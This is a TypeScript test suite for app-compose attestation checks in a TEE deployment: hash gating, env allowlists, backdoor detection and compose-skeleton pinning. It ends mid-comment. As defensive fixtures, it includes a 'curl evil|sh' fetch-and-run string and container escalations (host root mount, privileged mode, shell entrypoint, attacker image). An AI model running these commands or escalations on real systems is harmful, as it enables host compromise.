/*
 * Copyright (c) 2026. TxnLab Inc.
 * SPDX-License-Identifier: Apache-2.0
 */

// Cross-impl parity for app-compose validation, against the SAME live
// Phala tdx.small capture proto/go/attest/compose_test.go reads.
//
// The capture files are referenced by path out of proto/testdata rather
// than copied under ts/, so the two implementations cannot end up
// agreeing about different bytes — the one thing a parity fixture must
// not permit.
//
// This mirrors the Go suite case for case. Where it deliberately does
// NOT is noted at the case: JS and Go differ on what "absent field"
// and "wrong type" mean in JSON, and those differences are where a
// mirror silently stops mirroring.

import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { sha256 } from '@noble/hashes/sha2.js'
import { describe, expect, it } from 'vitest'

import {
    ComposeError,
    ComposeSkeletonError,
    EVENT_COMPOSE_HASH,
    composeSkeletonDigest,
    engineConfigForbiddenKeys,
    engineConfigViolations,
    extractComposeSkeleton,
    attestHexToBytes,
    phalaPreLaunchDigests,
    verifyAppCompose,
    verifyComposeHash,
    verifyEventLog,
    zeroSignalComposePolicy,
    zeroSignalSecretEnvNames,
} from '../src/attest/index.js'
import type { ComposePolicy, Violation } from '../src/attest/index.js'

const here = path.dirname(fileURLToPath(import.meta.url))
const testdataDir = path.resolve(here, '../../testdata')

const rawLog = fs.readFileSync(path.join(testdataDir, 'attest/ds_event_log.json'), 'utf8')
const quote = attestHexToBytes(
    fs.readFileSync(path.join(testdataDir, 'attest/ds_quote_hex.txt'), 'utf8').trim(),
)

/**
 * Recovers the measured document from the guest agent's /Info response.
 *
 * tcb_info is DOUBLY embedded — a JSON string whose contents are JSON —
 * so this parses twice. The inner app_compose is likewise a string, and
 * it is that string's exact bytes dstack hashed. Re-serializing
 * anywhere in here would reorder keys and hash a document dstack never
 * saw. The Go helper does the same, deliberately in the same shape.
 */
function loadAppCompose(): string {
    const info = JSON.parse(
        fs.readFileSync(path.join(testdataDir, 'attest/ds_info.json'), 'utf8'),
    ) as { tcb_info: unknown }
    const inner =
        typeof info.tcb_info === 'string'
            ? (JSON.parse(info.tcb_info) as { app_compose?: string })
            : (info.tcb_info as { app_compose?: string })
    const doc = inner.app_compose ?? ''
    if (doc === '') {
        throw new Error('capture carries no app_compose — every test below would be vacuous')
    }
    return doc
}

function hexOf(s: string): string {
    let out = ''
    for (const b of sha256(new TextEncoder().encode(s))) out += b.toString(16).padStart(2, '0')
    return out
}

/** Makes a synthetic document pass the hash gate, so the policy tests fail for policy reasons only. */
function sealed(doc: string): Record<string, string> {
    return { [EVENT_COMPOSE_HASH]: hexOf(doc) }
}

function violationsOf(fn: () => unknown): readonly Violation[] {
    try {
        fn()
    } catch (e) {
        if (e instanceof ComposeError) return e.violations
        throw e
    }
    throw new Error('expected a ComposeError, got success')
}

function codeOf(fn: () => unknown): string {
    try {
        fn()
    } catch (e) {
        if (e instanceof ComposeError) return e.code
        throw e
    }
    throw new Error('expected a ComposeError, got success')
}

function hasCode(v: readonly Violation[], code: string): boolean {
    return v.some((x) => x.code === code)
}

describe('app-compose hash gate', () => {
    // The anchor, and it deliberately pins NO constant. The measured
    // hash comes out of verifyEventLog — a replay already checked
    // byte-for-byte against the RTMR3 the hardware signed — so the
    // chain asserted is the real one: quote -> replayed log ->
    // compose-hash -> this document. A hard-coded digest would only
    // prove this code still agrees with itself.
    it('accepts the captured document against its own quote', () => {
        const measurements = verifyEventLog(rawLog, quote)
        expect(measurements[EVENT_COMPOSE_HASH]).toBeTruthy()
        expect(() => verifyComposeHash(loadAppCompose(), measurements)).not.toThrow()
    })

    it('refuses a document altered by one byte', () => {
        const measurements = verifyEventLog(rawLog, quote)
        // One appended space: semantically identical JSON, different
        // bytes. dstack hashes the TEXT, so an implementation that
        // normalized or re-serialized before hashing would accept this.
        expect(codeOf(() => verifyComposeHash(loadAppCompose() + ' ', measurements))).toBe(
            'compose_hash_mismatch',
        )
    })

    // Both ways this check can be turned off by omission rather than by
    // attack, and each must fail on its OWN code — an operator told
    // "mismatch" when the real problem is "your node published nothing"
    // is sent to debug the wrong thing.
    it('treats absence as a failure, not a skip', () => {
        const real = loadAppCompose()
        expect(codeOf(() => verifyComposeHash('', sealed(real)))).toBe('no_app_compose')
        expect(codeOf(() => verifyComposeHash(real, {}))).toBe('no_compose_hash')
        expect(codeOf(() => verifyComposeHash('', {}))).toBe('no_compose_hash')
    })

    it('runs before any field rule', () => {
        // Clean by every field rule, but not the measured document.
        const clean =
            '{"manifest_version":2,"runner":"docker-compose","docker_compose_file":"services: {}"}'
        const measured = sealed(
            '{"manifest_version":2,"runner":"docker-compose","docker_compose_file":"other"}',
        )
        expect(codeOf(() => verifyAppCompose(clean, measured))).toBe('compose_hash_mismatch')
    })
})

describe('app-compose policy', () => {
    // The detector's only POSITIVE fixture. The capture predates
    // --no-dev-os, so its allowed_envs really does name
    // DSTACK_AUTHORIZED_KEYS. A detector exercised only on clean input
    // agrees exactly with one that never fires.
    it('fires on the captured document, which carries the root backdoor', () => {
        const doc = loadAppCompose()
        const v = violationsOf(() => verifyAppCompose(doc, sealed(doc)))
        const found = v.find((x) => x.code === 'root_backdoor_env')
        expect(found).toBeDefined()
        expect(found?.detail).toContain('DSTACK_AUTHORIZED_KEYS')
    })

    // The two env rules are independent: an operator who widened
    // allowedEnvNames, for any reason, must not thereby be able to
    // permit a root credential.
    it('fires the backdoor rule regardless of the env allowlist', () => {
        const doc =
            '{"manifest_version":2,"runner":"docker-compose",' +
            '"docker_compose_file":"services: {}",' +
            '"allowed_envs":["DSTACK_AUTHORIZED_KEYS"]}'
        const policies: ComposePolicy[] = [
            {},
            { enforceEnvAllowlist: true, allowedEnvNames: ['DSTACK_AUTHORIZED_KEYS'] },
        ]
        for (const p of policies) {
            expect(hasCode(violationsOf(() => verifyAppCompose(doc, sealed(doc), p)), 'root_backdoor_env')).toBe(true)
        }
    })

    // The fail-closed semantic. An empty list read as "no constraint"
    // looks identical to the check working while permitting every name,
    // so turning the check OFF has to be something a caller writes
    // down, never something reached by leaving a list empty.
    it('forbids every name when the allowlist is empty but enforced', () => {
        const doc =
            '{"manifest_version":2,"runner":"docker-compose",' +
            '"docker_compose_file":"services: {}",' +
            '"allowed_envs":["NODE_LLM_OPENAI_API_KEY"]}'
        expect(
            hasCode(
                violationsOf(() => verifyAppCompose(doc, sealed(doc), { enforceEnvAllowlist: true })),
                'env_not_allowed',
            ),
        ).toBe(true)

        // ...and the same document with the name permitted must pass,
        // or the assertion above would also hold for a rule that
        // rejects everything unconditionally.
        expect(() =>
            verifyAppCompose(doc, sealed(doc), {
                enforceEnvAllowlist: true,
                allowedEnvNames: ['node_llm_openai_api_key'],
            }),
        ).not.toThrow()

        // Not enforcing means not enforcing — the backdoor rule above
        // is what still applies.
        expect(() => verifyAppCompose(doc, sealed(doc))).not.toThrow()
    })

    it('reports an unmodelled top-level field', () => {
        const doc =
            '{"manifest_version":2,"runner":"docker-compose",' +
            '"docker_compose_file":"services: {}","some_new_boot_hook":"curl evil|sh"}'
        const v = violationsOf(() => verifyAppCompose(doc, sealed(doc)))
        expect(hasCode(v, 'unknown_field')).toBe(true)
        // Naming it is the whole point — otherwise an operator has to
        // diff the document against this module by hand.
        expect(v.map((x) => x.detail).join(' ')).toContain('some_new_boot_hook')
    })

    it('pins the pre-launch script by digest', () => {
        const captured = loadAppCompose()
        const script = (JSON.parse(captured) as { pre_launch_script?: string }).pre_launch_script ?? ''
        expect(script).not.toBe('')
        // The capture's script is the known Phala CLI one, so the
        // bundled list must accept it. A failure here means the bundled
        // digest is stale, not that the capture is wrong.
        expect(phalaPreLaunchDigests()).toContain(hexOf(script))

        const pol: ComposePolicy = { preLaunchScriptDigests: phalaPreLaunchDigests() }
        const rebuilt = JSON.stringify({
            manifest_version: 2,
            runner: 'docker-compose',
            docker_compose_file: 'services: {}',
            pre_launch_script: script,
        })
        expect(() => verifyAppCompose(rebuilt, sealed(rebuilt), pol)).not.toThrow()

        // One appended newline must be caught. Rebuilt through the
        // serializer rather than by splicing the raw text: the script
        // is JSON-ESCAPED inside the document, so a string replace
        // matches nothing and leaves an "altered" document identical to
        // the original — a test that passes because it changed nothing.
        const altered = JSON.stringify({
            manifest_version: 2,
            runner: 'docker-compose',
            docker_compose_file: 'services: {}',
            pre_launch_script: script + '\n',
        })
        expect(
            hasCode(violationsOf(() => verifyAppCompose(altered, sealed(altered), pol)), 'pre_launch_script'),
        ).toBe(true)
    })

    // The deliberately inverted reading of an empty digest list: it is
    // the STRICTEST setting, not the absent one.
    it('permits only an empty script when the digest list is empty', () => {
        const none =
            '{"manifest_version":2,"runner":"docker-compose",' +
            '"docker_compose_file":"services: {}","pre_launch_script":""}'
        expect(() => verifyAppCompose(none, sealed(none))).not.toThrow()

        const some =
            '{"manifest_version":2,"runner":"docker-compose",' +
            '"docker_compose_file":"services: {}","pre_launch_script":"echo hi"}'
        expect(hasCode(violationsOf(() => verifyAppCompose(some, sealed(some))), 'pre_launch_script')).toBe(true)
    })

    it('checks a toggle only when it is pinned', () => {
        const doc =
            '{"manifest_version":2,"runner":"docker-compose",' +
            '"docker_compose_file":"services: {}","public_logs":true}'
        expect(() => verifyAppCompose(doc, sealed(doc))).not.toThrow()
        expect(
            hasCode(
                violationsOf(() => verifyAppCompose(doc, sealed(doc), { toggles: { public_logs: false } })),
                'toggle',
            ),
        ).toBe(true)
        expect(() =>
            verifyAppCompose(doc, sealed(doc), { toggles: { public_logs: true } }),
        ).not.toThrow()
    })

    it('reports a document that declares no compose', () => {
        const doc = '{"manifest_version":2,"runner":"docker-compose","docker_compose_file":"   "}'
        expect(
            hasCode(violationsOf(() => verifyAppCompose(doc, sealed(doc))), 'empty_docker_compose'),
        ).toBe(true)
    })

    it('treats a zero-valued pin as no pin', () => {
        const doc =
            '{"manifest_version":2,"runner":"docker-compose","docker_compose_file":"services: {}"}'
        expect(() => verifyAppCompose(doc, sealed(doc))).not.toThrow()
        const v = violationsOf(() =>
            verifyAppCompose(doc, sealed(doc), { manifestVersion: 3, runner: 'podman' }),
        )
        expect(hasCode(v, 'manifest_version')).toBe(true)
        expect(hasCode(v, 'runner')).toBe(true)
    })
})

describe('Go parity on the captured document', () => {
    // The one assertion that would catch the two implementations
    // drifting on the REAL document rather than on synthetic fixtures.
    // Go's compose_test.go runs the identical policy over the identical
    // bytes and asserts the same single violation.
    it('finds exactly the capture\'s known backdoor and nothing else', () => {
        const measurements = verifyEventLog(rawLog, quote)
        const v = violationsOf(() =>
            verifyAppCompose(loadAppCompose(), measurements, {
                preLaunchScriptDigests: phalaPreLaunchDigests(),
                allowedEnvNames: ['DSTACK_AUTHORIZED_KEYS'], // not enforced
            }),
        )
        expect(v.map((x) => x.code)).toEqual(['root_backdoor_env'])
    })

    // Go's json.Unmarshal leaves an absent field at its zero value and
    // this module does the same, so a document omitting everything
    // optional must reach the same verdict in both. Worth its own case:
    // the natural TS shape (optional properties, `undefined` checks)
    // diverges here, and the divergence is invisible on a full
    // document.
    it('treats an absent field as its zero value, like Go', () => {
        const doc = '{"docker_compose_file":"services: {}"}'
        const v = violationsOf(() =>
            verifyAppCompose(doc, sealed(doc), { manifestVersion: 2, runner: 'docker-compose' }),
        )
        expect(v.map((x) => x.code).sort()).toEqual(['manifest_version', 'runner'])
        expect(v.find((x) => x.code === 'manifest_version')?.detail).toContain('got 0')
    })
})

/**
 * The shape node/deploy/dstack/docker-compose.yaml.example produces. Kept
 * byte-identical to Go's `realisticCompose`, because the cross-language
 * assertion below is that both languages reduce THESE bytes to the same
 * digest — a fixture that drifted would make that test pass while the two
 * implementations disagreed about real documents.
 */
function realisticCompose(image: string, config: string): string {
    return (
        'services:\n' +
        '  zs-node:\n' +
        `    image: ${image}\n` +
        '    volumes:\n' +
        '      - /var/run/dstack.sock:/var/run/dstack.sock\n' +
        '      - zs-node-state:/data\n' +
        '    ports:\n' +
        '      - "9090:9090"\n' +
        '    environment:\n' +
        '      NODE_CONFIG_YAML: |\n' +
        config +
        '      NODE_LLM_OPENAI_API_KEY: ${NODE_LLM_OPENAI_API_KEY}\n' +
        '    restart: always\n' +
        'volumes:\n' +
        '  zs-node-state: {}\n'
    )
}

/**
 * The skeleton digest Go computes for `realisticCompose(REAL_IMAGE,
 * SOME_CONFIG)`, pinned in `goSkeletonDigestFixture`.
 *
 * A LITERAL on purpose, and the one place in this file where that is right.
 * Elsewhere a hardcoded digest proves only that the code agrees with itself;
 * here the point is that a SECOND implementation, in another language, reduces
 * the same bytes to the same value. Update BOTH sides or neither.
 */
const GO_SKELETON_DIGEST = 'b66a7d03d5c42a4094a9d0042bd6950ee9304d4837b9fe75c447a699115e7ad6'

const DIGEST_64 = '1111111111111111111111111111111111111111111111111111111111111111'
const REAL_IMAGE = `ghcr.io/txnlab/zs-node@sha256:${DIGEST_64}`
const SOME_CONFIG = '        zs:\n          operator_id: 1\n          node_id: 2\n'

describe('extractComposeSkeleton', () => {
    // The core of the template-match design: two operators running the same
    // release with DIFFERENT configs must produce the SAME skeleton, and
    // anything else they change must produce a different one.
    it('hides only the two holes', () => {
        const { skeleton: base, imageRef } = extractComposeSkeleton(
            realisticCompose(REAL_IMAGE, SOME_CONFIG),
        )
        expect(imageRef).toBe(REAL_IMAGE)
        expect(base).not.toContain('operator_id')
        expect(base).not.toContain(DIGEST_64)

        // A completely different config, same release — same skeleton, or
        // the per-release list becomes per-deployment again and the design
        // is back where it started. The blank line INSIDE the block is the
        // case a naive walk terminates on.
        const other = extractComposeSkeleton(
            realisticCompose(
                REAL_IMAGE,
                '        zs:\n          operator_id: 99\n' +
                    '          node_id: 7\n\n' +
                    '        llm:\n          provider: openai_passthrough\n',
            ),
        )
        expect(other.skeleton).toBe(base)

        // A different release image, same shape: also the same skeleton.
        const other2 = extractComposeSkeleton(
            realisticCompose(`ghcr.io/txnlab/zs-node@sha256:${'2'.repeat(64)}`, SOME_CONFIG),
        )
        expect(other2.skeleton).toBe(base)
        expect(other2.imageRef).not.toBe(imageRef)
    })

    // The half that makes the design worth anything. Nothing enumerates what
    // is forbidden — the claim is that anything not in the published compose
    // changes the skeleton. Each case is a real escalation.
    it.each([
        [
            'host bind mount',
            realisticCompose(REAL_IMAGE, SOME_CONFIG).replace(
                '      - zs-node-state:/data\n',
                '      - zs-node-state:/data\n      - /:/host\n',
            ),
        ],
        [
            'privileged',
            realisticCompose(REAL_IMAGE, SOME_CONFIG).replace(
                '    restart: always\n',
                '    privileged: true\n    restart: always\n',
            ),
        ],
        [
            'entrypoint override',
            realisticCompose(REAL_IMAGE, SOME_CONFIG).replace(
                '    restart: always\n',
                '    entrypoint: [/bin/sh]\n    restart: always\n',
            ),
        ],
        [
            'extra port',
            realisticCompose(REAL_IMAGE, SOME_CONFIG).replace(
                '      - "9090:9090"\n',
                '      - "9090:9090"\n      - "22:22"\n',
            ),
        ],
        [
            'extra env name',
            realisticCompose(REAL_IMAGE, SOME_CONFIG).replace(
                '    restart: always\n',
                '      NODE_TEE_DATAFLOW: sealed_local\n    restart: always\n',
            ),
        ],
        [
            'second service',
            `${realisticCompose(REAL_IMAGE, SOME_CONFIG)}  sidecar:\n    restart: always\n`,
        ],
    ])('catches %s without a rule naming it', (_name, doc) => {
        const base = composeSkeletonDigest(
            extractComposeSkeleton(realisticCompose(REAL_IMAGE, SOME_CONFIG)).skeleton,
        )
        let digest: string
        try {
            digest = composeSkeletonDigest(extractComposeSkeleton(doc).skeleton)
        } catch {
            // Refusing to extract is also a pass: the caller records it
            // as a compose_skeleton violation, pinned by the
            // unextractable cases in the policy block below.
            return
        }
        expect(digest).not.toBe(base)
    })

    // The one direction of the block walk that is a HOLE rather than merely
    // strict. Consuming too few lines is safe — the leftovers stay in the
    // skeleton and the digest stops matching. Consuming too many swallows
    // real compose directives into the span nobody checks.
    it('never overruns the config block', () => {
        const doc =
            `services:\n  zs-node:\n    image: ${REAL_IMAGE}\n` +
            '    environment:\n' +
            '      NODE_CONFIG_YAML: |\n' +
            '        zs:\n          operator_id: 1\n' +
            // Sibling of NODE_CONFIG_YAML (6 spaces), so YAML ends the
            // scalar here. A walk keying on the block BODY's indentation
            // rather than the KEY's would swallow it.
            '      NODE_TEE_DATAFLOW: sealed_local\n' +
            '    privileged: true\n'
        const { skeleton } = extractComposeSkeleton(doc)
        expect(skeleton).toContain('NODE_TEE_DATAFLOW')
        expect(skeleton).toContain('privileged')
    })

    /**
     * The sealed_local sidecar shape. Twin of Go's
     * TestExtractComposeSkeleton_SecondImageIsPinnedNotLifted — kept as a real
     * test on each side rather than left to the shared vectors, because a
     * vector pins the ANSWER both languages give and cannot say which half of
     * the rule produced it. Both implementations dropping the second image
     * would agree perfectly and still be wrong.
     */
    it('pins a second image into the skeleton instead of lifting it', () => {
        const engine = `ghcr.io/ardanlabs/kronk@sha256:${'2'.repeat(64)}`
        const doc = `${realisticCompose(REAL_IMAGE, SOME_CONFIG)}  kronk:\n    image: ${engine}\n`

        const { skeleton, imageRef } = extractComposeSkeleton(doc)
        expect(imageRef).toBe(REAL_IMAGE)
        // Literal in the structure is what makes the engine digest something an
        // operator cannot vary.
        expect(skeleton).toContain(engine)
        // Exactly one placeholder: two would mean the engine was lifted too,
        // and a released engine would then pass as a released node image.
        // Spelled literally because the constant is module-private on both
        // sides — and it is part of the cross-language contract, so a test that
        // imported it could not notice the two languages disagreeing on it.
        expect(skeleton.split('<ZS-IMAGE>').length - 1).toBe(1)

        const swapped = `${realisticCompose(REAL_IMAGE, SOME_CONFIG)}  kronk:\n    image: ghcr.io/attacker/kronk@sha256:${DIGEST_64}\n`
        const other = extractComposeSkeleton(swapped)
        expect(other.imageRef).toBe(imageRef)
        expect(composeSkeletonDigest(other.skeleton)).not.toBe(composeSkeletonDigest(skeleton))
    })

    /**
     * The tie-breaker the rule above rests on. Twin of Go's
     * TestExtractComposeSkeleton_LiftsTheFirstImageOnly.
     */
    it('lifts the FIRST image, so a reorder changes both the ref and the skeleton', () => {
        const engine = `ghcr.io/ardanlabs/kronk@sha256:${'2'.repeat(64)}`
        const nodeFirst = `services:\n  zs-node:\n    image: ${REAL_IMAGE}\n  kronk:\n    image: ${engine}\n`
        const engineFirst = `services:\n  kronk:\n    image: ${engine}\n  zs-node:\n    image: ${REAL_IMAGE}\n`

        const first = extractComposeSkeleton(nodeFirst)
        expect(first.imageRef).toBe(REAL_IMAGE)
        // EXACT BYTES, not a containment check — "literal text" is the whole
        // claim about the second image, and `toContain` survives a regression
        // that re-indents or relocates it.
        expect(first.skeleton).toBe(
            `services:\n  zs-node:\n    image: <ZS-IMAGE>\n  kronk:\n    image: ${engine}\n`,
        )

        const reordered = extractComposeSkeleton(engineFirst)
        // Refused by the release list (this ref is not a node image) AND by the
        // skeleton digest. Both asserted, since either alone would still admit
        // the document if the other regressed.
        expect(reordered.imageRef).toBe(engine)
        expect(reordered.skeleton).toBe(
            `services:\n  kronk:\n    image: <ZS-IMAGE>\n  zs-node:\n    image: ${REAL_IMAGE}\n`,
        )
        expect(composeSkeletonDigest(reordered.skeleton)).not.toBe(
            composeSkeletonDigest(first.skeleton),
        )

        // The NORMALIZATION half needs a non-canonical line to bite on. Written
        // canonically above, copying the line and re-emitting `${indent}image:
        // ${ref}` produce identical bytes, so the exact comparison catches
        // relocation and dropping but not rewriting. Extra interior and
        // trailing spaces make the two visibly different. Twin of Go's.
        const odd = `services:\n  zs-node:\n    image: ${REAL_IMAGE}\n  kronk:\n    image:   ${engine}  \n`
        expect(extractComposeSkeleton(odd).skeleton).toBe(
            `services:\n  zs-node:\n    image: <ZS-IMAGE>\n  kronk:\n    image:   ${engine}  \n`,
        )
    })

    /**
     * Twin of Go's TestExtractComposeSkeleton_SidecarMustBePinnedByDigest. A
     * second image is checked against no release list, so its literal bytes are
     * its only pin — and dstack hashes this document before expanding `${VAR}`,
     * so an unpinned one would publish a single skeleton digest covering every
     * engine the operator later supplies.
     */
    it.each([
        ['env substitution', '${ENGINE_IMAGE}'],
        ['tag', 'ghcr.io/ardanlabs/kronk:latest-cuda'],
        ['bare name', 'kronk'],
        ['short digest', 'ghcr.io/ardanlabs/kronk@sha256:abc123'],
        // The upper bound needs its own case: every other refusal here is too
        // SHORT, so relaxing `!== 64` to `< 64` passed the whole suite. It is
        // also the one comparison whose two implementations count different
        // units — Go bytes, TS UTF-16 code units.
        ['long digest', `ghcr.io/ardanlabs/kronk@sha256:${'a'.repeat(65)}`],
        // Letters on purpose: an all-digit digest is unchanged by upper-casing,
        // so that spelling of this case would assert nothing.
        ['uppercase digest', `ghcr.io/ardanlabs/kronk@sha256:${'ABCDEF01'.repeat(8)}`],
        ['empty repository', `@sha256:${DIGEST_64}`],
        ['wrong algorithm', `ghcr.io/ardanlabs/kronk@sha512:${DIGEST_64}`],
        // `${VAR}` in the REPOSITORY half, digest literal. This one genuinely
        // content-addresses the bytes, so it is not an escape — it is refused
        // because the rule is spelled `<repository>@sha256:<hex>` and because
        // three documents assert "a `${VAR}` is not a pin" without qualifying
        // which half they mean.
        ['interpolated repository', `\${ENGINE_REPO}@sha256:${DIGEST_64}`],
    ])('refuses an unpinned sidecar image (%s)', (_name, ref) => {
        const doc = `services:\n  zs-node:\n    image: ${REAL_IMAGE}\n  kronk:\n    image: ${ref}\n`
        try {
            extractComposeSkeleton(doc)
            throw new Error('expected a refusal')
        } catch (e) {
            expect(e).toBeInstanceOf(ComposeSkeletonError)
            expect((e as ComposeSkeletonError).code).toBe('unpinned_sidecar')
        }
    })

    it('does NOT hold the first image to the digest-pin rule', () => {
        // It is lifted to a placeholder and judged by trustedNodeImages, which
        // is stronger than a shape test; refusing it here would reject the
        // release compose's own `${VAR}` first line for a covered property.
        const engine = `ghcr.io/ardanlabs/kronk@sha256:${'2'.repeat(64)}`
        const doc = `services:\n  zs-node:\n    image: \${NODE_IMAGE}\n  kronk:\n    image: ${engine}\n`
        expect(extractComposeSkeleton(doc).imageRef).toBe('${NODE_IMAGE}')
    })

    it.each([
        ['tab_indent', 'services:\n\timage: x\n'],
        ['no_image', 'services:\n  zs-node:\n    restart: always\n'],
    ])('refuses with code %s', (code, doc) => {
        try {
            extractComposeSkeleton(doc)
            throw new Error('expected a refusal')
        } catch (e) {
            expect(e).toBeInstanceOf(ComposeSkeletonError)
            expect((e as ComposeSkeletonError).code).toBe(code)
        }
    })

    // GO PARITY, and the assertion that actually matters for this feature.
    // The two implementations are separate line-walkers in separate
    // languages; a divergence means the proxy and this client reach opposite
    // verdicts on identical evidence, silently. The digest is pinned in Go's
    // TestSkeletonDigest_GoTSParity over the same fixture.
    it('reduces the shared fixture to the digest Go computes', () => {
        const { skeleton } = extractComposeSkeleton(realisticCompose(REAL_IMAGE, SOME_CONFIG))
        expect(composeSkeletonDigest(skeleton)).toBe(GO_SKELETON_DIGEST)
    })
})

describe('compose skeleton policy', () => {
    // These lists are per-RELEASE data each consumer ships on its own
    // cadence, so the state that matters is a build whose list is not
    // populated yet.
    it('fails closed on an empty release list', () => {
        const doc = JSON.stringify({
            manifest_version: 2,
            runner: 'docker-compose',
            docker_compose_file: realisticCompose(REAL_IMAGE, SOME_CONFIG),
        })
        expect(() =>
            verifyAppCompose(doc, sealed(doc), { enforceComposeSkeleton: true }),
        ).toThrow(ComposeError)

        // And the flag must actually gate, or the test above passes for a
        // check that always runs.
        expect(() => verifyAppCompose(doc, sealed(doc), {})).not.toThrow()
    })

    it('accepts a populated list and still checks the image separately', () => {
        const compose = realisticCompose(REAL_IMAGE, SOME_CONFIG)
        const { skeleton, imageRef } = extractComposeSkeleton(compose)
        const doc = JSON.stringify({
            manifest_version: 2,
            runner: 'docker-compose',
            docker_compose_file: compose,
        })
        const p: ComposePolicy = {
            enforceComposeSkeleton: true,
            trustedComposeSkeletons: [composeSkeletonDigest(skeleton)],
            trustedNodeImages: [imageRef],
        }
        expect(() => verifyAppCompose(doc, sealed(doc), p)).not.toThrow()

        // Right shape, unpublished image.
        const v = violationsOf(() =>
            verifyAppCompose(doc, sealed(doc), {
                ...p,
                trustedNodeImages: [`ghcr.io/txnlab/zs-node@sha256:${'3'.repeat(64)}`],
            }),
        )
        expect(hasCode(v, 'node_image')).toBe(true)
    })

    // Twin of Go's TestComposeSkeletonPolicy_UnextractableIsAViolation, and
    // the half the refusal cases above do NOT reach: they call
    // extractComposeSkeleton directly, and both suites carried a comment
    // deferring "the caller records it as a violation" to nobody.
    //
    // It is the fail-open, not a completeness nicety. Extraction failing
    // means there is no digest to compare, so the branch that consults the
    // release list never runs; drop the violation and an unreadable compose
    // verifies CLEAN against a fully populated policy. A compose nobody
    // could parse would then beat a compose that merely does not match —
    // and it takes no knowledge of the release list to write one.
    it.each([
        ['tab indent', `services:\n\timage: ${REAL_IMAGE}\n`],
        ['no image', 'services:\n  zs-node:\n    restart: always\n'],
        [
            'two images',
            `${realisticCompose(REAL_IMAGE, SOME_CONFIG)}  other:\n    image: alpine\n`,
        ],
    ])('records an unextractable compose (%s) as a violation', (_name, compose) => {
        // Populated, so a surviving mutation cannot hide behind the
        // empty-list refusal the first case in this block pins.
        const { skeleton, imageRef } = extractComposeSkeleton(
            realisticCompose(REAL_IMAGE, SOME_CONFIG),
        )
        const doc = JSON.stringify({
            manifest_version: 2,
            runner: 'docker-compose',
            docker_compose_file: compose,
        })
        const v = violationsOf(() =>
            verifyAppCompose(doc, sealed(doc), {
                enforceComposeSkeleton: true,
                trustedComposeSkeletons: [composeSkeletonDigest(skeleton)],
                trustedNodeImages: [imageRef],
            }),
        )
        expect(hasCode(v, 'compose_skeleton')).toBe(true)
    })
})

/**
 * Builds a policy-clean document differing only in allowed_envs, so a failure
 * is attributable to the env rule and to nothing else.
 */
function composeWithEnvs(envs: readonly string[]): string {
    return JSON.stringify({
        manifest_version: 2,
        runner: 'docker-compose',
        docker_compose_file: 'services:\n  zs-node:\n    image: x@sha256:00\n',
        allowed_envs: envs,
        local_key_provider_enabled: false,
    })
}

describe('zeroSignalComposePolicy', () => {
    // Pinned to the one document a live CVM is known to have measured. The
    // capture is the PROBE deployment rather than a zs-node one, so it is a
    // NEGATIVE fixture — which is what makes it worth having. A policy tested
    // only against a document written from it agrees with itself.
    it('names exactly what is wrong with the real capture', () => {
        const measurements = verifyEventLog(rawLog, quote)
        const v = violationsOf(() =>
            verifyAppCompose(loadAppCompose(), measurements, zeroSignalComposePolicy()),
        )
        const count = (c: string) => v.filter((x) => x.code === c).length

        // COUNTED, not merely present. "At least one violation" is satisfied
        // by the unconditional backdoor rule alone, so it stays green with
        // enforceEnvAllowlist switched off — the single most load-bearing
        // field in the policy.
        expect(count('root_backdoor_env')).toBe(1)
        expect(count('env_not_allowed')).toBe(5)

        // manifest_version, runner and local_key_provider_enabled all match
        // the capture, so none can be what failed above. One firing means the
        // policy pins a value no live Phala CVM has — which would refuse every
        // honest node while every test about refusal still passed.
        for (const unwanted of [
            'manifest_version',
            'runner',
            'toggle',
            'pre_launch_script',
            'empty_docker_compose',
        ]) {
            expect(count(unwanted)).toBe(0)
        }
    })

    // The positive half. Without it everything above is satisfied by a policy
    // that refuses everything — taking every honest node off the network while
    // looking maximally secure.
    it('accepts the deployment’s own secret channel', () => {
        const names = [
            ...zeroSignalSecretEnvNames(),
            // The suffix channel: the keystore loads any <PREFIX>_MNEMONIC, so
            // the prefix is operator-chosen. The lowercase entry also pins the
            // case-insensitive match.
            'OPERATOR_SIGNING_MNEMONIC',
            'some_payment_mnemonic',
        ]
        const doc = composeWithEnvs(names)
        expect(() =>
            verifyAppCompose(doc, sealed(doc), zeroSignalComposePolicy()),
        ).not.toThrow()
    })

    // What the suffix must never become. applyEnv runs AFTER the measured
    // NODE_CONFIG_YAML, so each of these rewrites the measured document
    // through the unmeasured channel — and declaring the NAME is the part
    // that moves compose_hash, which is why a remote verifier can catch it.
    it.each([
        ['NODE_LLM_OPENAI_BASE_URL', 'redirects the one upstream rung 1 names'],
        ['NODE_TEE_DATAFLOW', 'rewrites the claim itself'],
        ['NODE_CONFIG_YAML', 'the measured document, unmeasured'],
        ['MNEMONIC', 'no leading underscore: must not match the suffix'],
        ['NOT_A_MNEMONIC_KEY', 'contains the suffix without ending in it'],
    ])('refuses %s in the unmeasured env channel', (name) => {
        const doc = composeWithEnvs([name])
        expect(() => verifyAppCompose(doc, sealed(doc), zeroSignalComposePolicy())).toThrow(
            ComposeError,
        )
    })

    // The guard the cases above cannot reach: they vary the env NAME, which a
    // correct suffix rejects on its own, so they stay green with the anchor
    // guard deleted (measured in Go). The guard is about a malformed POLICY,
    // and the failure it prevents is a widening — a suffix with no leading
    // underscore matches any name merely ending in those letters, so a policy
    // meaning "permit key material" would quietly permit every config name
    // ending in KEY.
    //
    // ONE NAME PER CASE is load-bearing: with a second, still-refused name in
    // the document the call throws either way and the guard could be deleted
    // with this green.
    it.each([
        ['KEY', 'NODE_LLM_OPENAI_BASE_URL_KEY'],
        ['MNEMONIC', 'NODE_TEE_DATAFLOW_MNEMONIC'],
        ['', 'NODE_TEE_DATAFLOW'],
        ['   ', 'NODE_TEE_DATAFLOW'],
    ])('ignores the malformed suffix %j rather than matching it', (suffix, name) => {
        const p: ComposePolicy = {
            enforceEnvAllowlist: true,
            allowedEnvSuffixes: [suffix],
        }
        const doc = composeWithEnvs([name])
        expect(() => verifyAppCompose(doc, sealed(doc), p)).toThrow(ComposeError)
    })

    // The counterpart, or the case above is satisfied by a suffix rule that
    // never matches anything at all.
    it('matches a well-formed suffix', () => {
        const p: ComposePolicy = {
            enforceEnvAllowlist: true,
            allowedEnvSuffixes: ['_MNEMONIC'],
        }
        const doc = composeWithEnvs(['OPERATOR_SIGNING_MNEMONIC'])
        expect(() => verifyAppCompose(doc, sealed(doc), p)).not.toThrow()
    })

    // Go parity on the shared constants. The two policies are separate
    // literals in separate languages, so nothing but a test stops them
